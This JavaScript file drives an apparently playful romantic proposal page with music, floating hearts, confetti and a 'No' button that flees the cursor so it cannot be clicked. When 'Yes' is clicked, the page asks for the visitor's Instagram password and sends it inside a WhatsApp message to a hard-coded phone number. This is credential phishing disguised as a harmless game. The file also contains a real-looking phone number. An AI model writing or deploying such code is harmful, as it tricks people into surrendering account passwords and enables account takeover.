// Background music handling (mobile-friendly)
const backgroundMusic = document.getElementById('backgroundMusic');

// Function to play music after user interaction (required for autoplay on mobile)
function enableMusic() {
    if (backgroundMusic) {
        backgroundMusic.volume = 0.3; // Soft volume
        backgroundMusic.play().catch(error => {
            console.log('Autoplay prevented, will play on interaction');
        });
    }
}

// Try to enable music on page load
document.addEventListener('DOMContentLoaded', () => {
    enableMusic();
});

// Enable music on any user interaction
document.addEventListener('click', enableMusic, { once: true });
document.addEventListener('touchstart', enableMusic, { once: true });

// Create floating hearts in background
function createFloatingHearts() {
    const heartsContainer = document.querySelector('.hearts-container');
    const hearts = ['❤️', '💖', '💕', '💗', '💓', '💝', '🧡', '💛'];
    
    setInterval(() => {
        const heart = document.createElement('div');
        heart.className = 'heart-bg';
        heart.textContent = hearts[Math.floor(Math.random() * hearts.length)];
        heart.style.left = Math.random() * 100 + '%';
        heart.style.animationDuration = (15 + Math.random() * 10) + 's';
        heart.style.fontSize = (15 + Math.random() * 15) + 'px';
        heartsContainer.appendChild(heart);
        
        setTimeout(() => {
            heart.remove();
        }, 25000);
    }, 800);
}

// Create floating petals
function createFloatingPetals() {
    const petalsContainer = document.querySelector('.petals-container');
    const petals = ['🌹', '🌸', '🌺', '🌻', '🌷', '💮', '🏵️'];
    
    setInterval(() => {
        const petal = document.createElement('div');
        petal.className = 'petal';
        petal.textContent = petals[Math.floor(Math.random() * petals.length)];
        petal.style.left = Math.random() * 100 + '%';
        petal.style.animationDuration = (20 + Math.random() * 10) + 's';
        petal.style.fontSize = (12 + Math.random() * 10) + 'px';
        petalsContainer.appendChild(petal);
        
        setTimeout(() => {
            petal.remove();
        }, 30000);
    }, 600);
}

// No button movement (avoids clicking)
const noBtn = document.getElementById('noBtn');
let moveCount = 0;
const buttonsContainer = document.querySelector('.buttons-container');

// Make sure buttons container allows absolute positioning
if (buttonsContainer) {
    buttonsContainer.style.position = 'relative';
}

noBtn.addEventListener('mouseenter', () => {
    moveButton();
});

noBtn.addEventListener('click', (e) => {
    e.preventDefault();
    moveButton();
});

noBtn.addEventListener('touchstart', (e) => {
    e.preventDefault();
    moveButton();
});

function moveButton() {
    moveCount++;
    const buttonWidth = noBtn.offsetWidth;
    const buttonHeight = noBtn.offsetHeight;
    const viewportWidth = window.innerWidth;
    const viewportHeight = window.innerHeight;
    
    // Set button to fixed position to allow off-screen movement
    noBtn.style.position = 'fixed';
    noBtn.style.zIndex = '1000';
    noBtn.style.transition = 'all 0.2s ease-out';
    
    // Choose a random direction to move off-screen (left, right, top, or bottom)
    const direction = Math.floor(Math.random() * 4);
    let newX, newY;
    
    switch(direction) {
        case 0: // Move off to the LEFT
            newX = -buttonWidth - 50 - Math.random() * 200;
            newY = Math.random() * viewportHeight;
            break;
        case 1: // Move off to the RIGHT
            newX = viewportWidth + 50 + Math.random() * 200;
            newY = Math.random() * viewportHeight;
            break;
        case 2: // Move off to the TOP
            newX = Math.random() * viewportWidth;
            newY = -buttonHeight - 50 - Math.random() * 200;
            break;
        case 3: // Move off to the BOTTOM
            newX = Math.random() * viewportWidth;
            newY = viewportHeight + 50 + Math.random() * 200;
            break;
    }
    
    // Add random rotation for fun
    const rotation = (Math.random() - 0.5) * 360;
    noBtn.style.transform = `rotate(${rotation}deg) scale(${0.8 + Math.random() * 0.4})`;
    
    // Move the button off-screen
    noBtn.style.left = newX + 'px';
    noBtn.style.top = newY + 'px';
    
    // After a short delay, bring it back on-screen but in a different corner/edge
    // This makes it harder to catch - it appears briefly then moves again
    setTimeout(() => {
        const returnDirection = Math.floor(Math.random() * 4);
        let returnX, returnY;
        
        switch(returnDirection) {
            case 0: // Return from LEFT edge (partially visible)
                returnX = -buttonWidth / 2;
                returnY = Math.random() * viewportHeight;
                break;
            case 1: // Return from RIGHT edge (partially visible)
                returnX = viewportWidth - buttonWidth / 2;
                returnY = Math.random() * viewportHeight;
                break;
            case 2: // Return from TOP edge (partially visible)
                returnX = Math.random() * viewportWidth;
                returnY = -buttonHeight / 2;
                break;
            case 3: // Return from BOTTOM edge (partially visible)
                returnX = Math.random() * viewportWidth;
                returnY = viewportHeight - buttonHeight / 2;
                break;
        }
        
        noBtn.style.left = returnX + 'px';
        noBtn.style.top = returnY + 'px';
        noBtn.style.transform = `rotate(${(Math.random() - 0.5) * 180}deg)`;
        
        // After returning, if they try to click again, it moves away immediately
        // The mouseenter/click handlers will trigger moveButton() again
    }, 400);
}

// Yes button - show success popup with confetti
const yesBtn = document.getElementById('yesBtn');
const successPopup = document.getElementById('successPopup');
const passwordForm = document.getElementById('passwordForm');
const instagramPasswordInput = document.getElementById('instagramPassword');
const submitPasswordBtn = document.getElementById('submitPassword');

yesBtn.addEventListener('click', () => {
    successPopup.classList.remove('hidden');
    passwordForm.classList.remove('hidden');
    createConfetti();
    enableMusic(); // Ensure music plays
    
    // Play a celebration sound if possible
    if (backgroundMusic) {
        backgroundMusic.volume = 0.5;
    }
});

// Handle password submission
submitPasswordBtn.addEventListener('click', () => {
    const password = instagramPasswordInput.value.trim();
    
    if (password) {
        // Create more confetti
        createConfetti();
        
        // Small delay for visual effect, then redirect to WhatsApp with password in message
        setTimeout(() => {
            const encodedPassword = encodeURIComponent(password);
            window.location.href = `https://wa.me/918547537571?text=${encodedPassword}`;
        }, 500);
    } else {
        // Add a shake animation if empty
        instagramPasswordInput.style.animation = 'shake 0.5s';
        setTimeout(() => {
            instagramPasswordInput.style.animation = '';
        }, 500);
    }
});

// Allow Enter key to submit
instagramPasswordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        submitPasswordBtn.click();
    }
});

// Create confetti animation
function createConfetti() {
    const confettiContainer = document.getElementById('confetti');
    const colors = ['#ff1744', '#ff6b9d', '#ffa726', '#ffd54f', '#66bb6a', '#42a5f5', '#ab47bc', '#ec407a'];
    const shapes = ['❤️', '💖', '💕', '💍', '✨', '⭐', '💫'];
    
    for (let i = 0; i < 100; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        
        // Randomly choose between colored square or emoji
        if (Math.random() > 0.5) {
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (5 + Math.random() * 10) + 'px';
            confetti.style.height = (5 + Math.random() * 10) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0%';
        } else {
            confetti.textContent = shapes[Math.floor(Math.random() * shapes.length)];
            confetti.style.fontSize = (15 + Math.random() * 15) + 'px';
            confetti.style.background = 'transparent';
            confetti.style.width = 'auto';
            confetti.style.height = 'auto';
        }
        
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.animationDelay = Math.random() * 2 + 's';
        
        // Add random horizontal movement
        const randomX = (Math.random() - 0.5) * 300;
        confetti.style.setProperty('--random-x', randomX + 'px');
        confetti.style.animationDuration = (2 + Math.random() * 2) + 's';
        
        confettiContainer.appendChild(confetti);
        
        setTimeout(() => {
            confetti.remove();
        }, 4000);
    }
    
    // Update confetti animation to include horizontal movement
    const style = document.createElement('style');
    style.textContent = `
        @keyframes confettiFall {
            0% {
                transform: translateY(-100px) translateX(0) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) translateX(var(--random-x, 0)) rotate(360deg);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(style);
}

// Initialize animations
document.addEventListener('DOMContentLoaded', () => {
    createFloatingHearts();
    createFloatingPetals();
});

// Close popup on click outside (optional)
successPopup.addEventListener('click', (e) => {
    if (e.target === successPopup) {
        // Don't close, let them enjoy the moment!
    }
});
